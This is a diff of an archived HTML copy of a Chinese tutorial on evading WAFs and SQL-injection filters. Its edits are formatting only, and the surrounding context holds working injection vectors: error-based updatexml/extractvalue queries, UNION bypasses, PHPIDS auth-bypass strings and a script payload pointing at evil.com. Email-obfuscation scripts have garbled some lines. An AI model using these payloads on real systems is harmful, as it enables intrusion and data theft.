@@ -3,12 +3,12 @@
 			<head>
 			     <title>深入了解SQL注入绕过waf和过滤机制 - r00tgrok</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/968">http://drops.wooyun.org/tips/968</a></h1>
 				
       <p>
-        <p>知己知彼百战不殆 --孙子兵法</p>
+        </p><p>知己知彼百战不殆 --孙子兵法</p>
 
 <p>[目录]</p>
 
@@ -25,7 +25,7 @@
 
 <h2>0x00 前言</h2>
 
-<hr />
+<hr>
 
 <p>笔者前几天在做测试时输入攻击向量后页面发生了重定向甚至异常输入也是重定向怀疑其中有WAF在作怪。之前对WAF接触比较少纯粹是新手趁此科普了一下并查阅了一些绕过WAF的方法。所找到的资料中主要分为两类SQL注入和XSS绕过笔者SQL注入同样是新手因此集中了不少资料并进行整理和总结因此有本文的产生。</p>
 
@@ -35,7 +35,7 @@
 
 <h2>0x01 WAF的常见特征</h2>
 
-<hr />
+<hr>
 
 <p>之所以要谈到WAF的常见特征是为了更好的了解WAF的运行机制这样就能增加几分绕过的机会了。本文不对WAF做详细介绍只谈及几点相关的。</p>
 
@@ -71,7 +71,7 @@
 
 <h2>0x02 绕过WAF的方法</h2>
 
-<hr />
+<hr>
 
 <p>从笔者目前找到的资料来看可以把这些绕过waf的技术分为9类包含从初级到高级技巧</p>
 
@@ -219,7 +219,7 @@ strcmp(left('password',1), 0x71) = -1
 
 <p>MySQL/PostgreSQL支持XML函数</p>
 
-<pre><code>Select UpdateXML('&lt;script x=_&gt;&lt;/script&gt; ',<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="dbfcf4a8b8a9b2abaff49ba3">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>/','src=//evil.com');
+<pre><code>Select UpdateXML('&lt;script x=_&gt;&lt;/script&gt; ',<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="dbfcf4a8b8a9b2abaff49ba3">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>/','src=//evil.com');
 ?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))
 SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror));　//postgresql
 ?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
@@ -231,11 +231,11 @@ SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror)
 
 <p>这里我把非字母数字的字符都规在了特殊符号一类这些符号有特殊的含义和用法涉及信息量比前面提到的几种都要多</p>
 
-<p>先看下drops上<a><a href="http://drops.wooyun.org/tips/132">waf的绕过技巧</a>一文使用的几个例子</p></p>
+<p>先看下drops上<a><a href="http://drops.wooyun.org/tips/132">waf的绕过技巧</a>一文使用的几个例子</a></p><p></p>
 
 <pre><code>1.使用反引号`，例如select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用
 2.神奇的"-+."，select+id-1+1.from users; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤
-3.@符号，select@^1.from users; @<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5eb9caf6bae4d0bbd1c6b7d9d1bbf0c4bae7d7bbf8dc1e283f2c">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>_name，<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="24c09ca4c09c8e64cc858cc3809ec3b08cc2ac93c18abec09dad">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>，@@表示系统变量
+3.@符号，select@^1.from users; @<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5eb9caf6bae4d0bbd1c6b7d9d1bbf0c4bae7d7bbf8dc1e283f2c">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>_name，<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="24c09ca4c09c8e64cc858cc3809ec3b08cc2ac93c18abec09dad">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>，@@表示系统变量
 4.Mysql function() as xxx  也可不用as和空格　　 select-count(id)test from users;  //绕过空格限制
 </code></pre>
 
@@ -247,7 +247,7 @@ SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror)
   笔者搜罗了部分可能发挥大作用的字符(这里未包括'、*、/等在内考虑到前面已经出现较多次了)
 </p>
 
-<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0363e083827de0838222e0838243e08382">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>%、()、[]、.、-、+ 、|、%00
+<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0363e083827de0838222e0838243e08382">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>%、()、[]、.、-、+ 、|、%00
 </code></pre>
 
 <p>
@@ -310,7 +310,7 @@ SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror)
 </p>
 
 <p>
-  <img src="http://static.wooyun.org/201402/2014022613524357191.jpg" alt="2014022613524357191.jpg" />
+  <img src="../images_result/images/2014022613524357191.jpg" alt="2014022613524357191.jpg">
 </p>
 
 <p>
@@ -359,7 +359,7 @@ Unwise : { } | \ ^ [ ] `
 </p>
 
 <p>
-  <img src="http://static.wooyun.org/201402/2014022613570037001.jpg" alt="2014022613570037001.jpg" />
+  <img src="../images_result/images/2014022613570037001.jpg" alt="2014022613570037001.jpg">
 </p>
 
 <p>
@@ -367,7 +367,7 @@ Unwise : { } | \ ^ [ ] `
 </p>
 
 <p>
-  <img src="http://static.wooyun.org/201402/2014022613574878521.jpg" alt="2014022613574878521.jpg" />
+  <img src="../images_result/images/2014022613574878521.jpg" alt="2014022613574878521.jpg">
 </p>
 
 <h3>
@@ -410,7 +410,7 @@ id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.ta
   0x03 SQLi Filter的实现及Evasion
 </h2>
 
-<hr />
+<hr>
 
 <p>
   SQL Injection时用得最多的一些关键字如下
@@ -461,11 +461,11 @@ union select user, password from users　　 =&gt;　　1 || (select user from u
 </p>
 
 <p>
-  <img src="http://static.wooyun.org/201402/2014022614064414576.png" alt="2014022614064414576.png" />
+  <img src="../images_result/images/2014022614064414576.png" alt="2014022614064414576.png">
 </p>
 
 <p>
-  <img src="http://static.wooyun.org/201402/2014022614071092308.png" alt="2014022614071092308.png" />
+  <img src="../images_result/images/2014022614071092308.png" alt="2014022614071092308.png">
 </p>
 
 <p>
@@ -479,7 +479,7 @@ union select user, password from users　　 =&gt;　　1 || (select user from u
   0x04 延伸及测试向量示例
 </h2>
 
-<hr />
+<hr>
 
 <pre><code>a) CMS绕过实例
 b) WAF绕过示例
@@ -561,7 +561,7 @@ OR stripos($queryString, 'concat')) { die('Illegal Operation'); }
   2. PHPIDS 0.6.4 
 </h4>
 
-<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0761686820263a4766">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:=0x1 div'1a false != true 　　//auth bypass
+<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0761686820263a4766">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:=0x1 div'1a false != true 　　//auth bypass
 foo'div count(select`pass`from(users)where mid(pass,1,1)rlike lower(conv(10,pi()*pi(),pi()*pi())) )-'0
 a'in(true) and false */*!(true)union#newline select pass`alias`from users where true*/* n'1
 </code></pre>
@@ -796,7 +796,7 @@ id=-725+UNION+SELECT+1,version(),3,4,5--sp_password //使用sp_password隐藏log
   0x05 本文小结
 </h2>
 
-<hr />
+<hr>
 
 <p>
   本文内容到这里内容差不多就算是完了回顾一下本文内容主要从三个方面展开绕过WAF的方法、Filter的实现机制和Evasion措施、测试示例和向量。本文的第二部分”绕过WAF的方法“花了较多时间需要参照已有的总结进行自己的总结并给出示例第三、四两部分更多的是粘贴已收集到的向量因此较快。本文内容和篇幅较多涉及信息量很大但是仍有许多不完善或遗漏的地方。
@@ -814,7 +814,7 @@ id=-725+UNION+SELECT+1,version(),3,4,5--sp_password //使用sp_password隐藏log
   0x06 参考资料
 </h2>
 
-<hr />
+<hr>
 
 <p>
   WAF介绍http://www.nsfocus.com/waf/jishu/js_01.html
@@ -886,7 +886,7 @@ id=-725+UNION+SELECT+1,version(),3,4,5--sp_password //使用sp_password隐藏log
 
 <p>
   http://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
-</p>      </p>
+</p>      <p></p>
     
 			</body>
 		</html>
